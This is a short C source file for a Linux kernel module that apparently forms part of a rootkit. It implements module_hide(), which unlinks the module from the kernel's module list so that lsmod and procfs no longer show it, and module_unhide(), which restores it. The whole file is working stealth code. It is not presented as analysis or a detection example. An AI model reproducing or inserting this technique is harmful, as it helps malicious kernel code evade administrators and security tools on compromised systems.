#include <linux/module.h>
#include <linux/list.h>
#include <linux/kobject.h>
#include <asm-generic/errno-base.h>
#include <stdbool.h>

#include "module_hide.h"
#include "log.h"

static struct list_head *module_list;

static bool module_hidden = false;

/** module_hide() - Hide THIS_MODULE from lsmod.
 *
 * Removes module from procfs.
 *
 * Returns: -EINVAL if module is already hidden, 0 otherwise
 */
int module_hide(void)
{
	if (module_hidden)
		return -EINVAL;

	module_list = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);

	module_hidden = true;
	return 0;
}

/** module_unhide() - Unhide THIS_MODULE from lsmod.
 *
 * Puts module back to procfs.
 *
 * Returns: -EINVAL if module is not hidden, 0 otherwise.
 */
int module_unhide(void)
{
	if (!module_hidden)
		return -EINVAL;

	list_add(&THIS_MODULE->list, module_list);

	module_hidden = false;
	return 0;
}
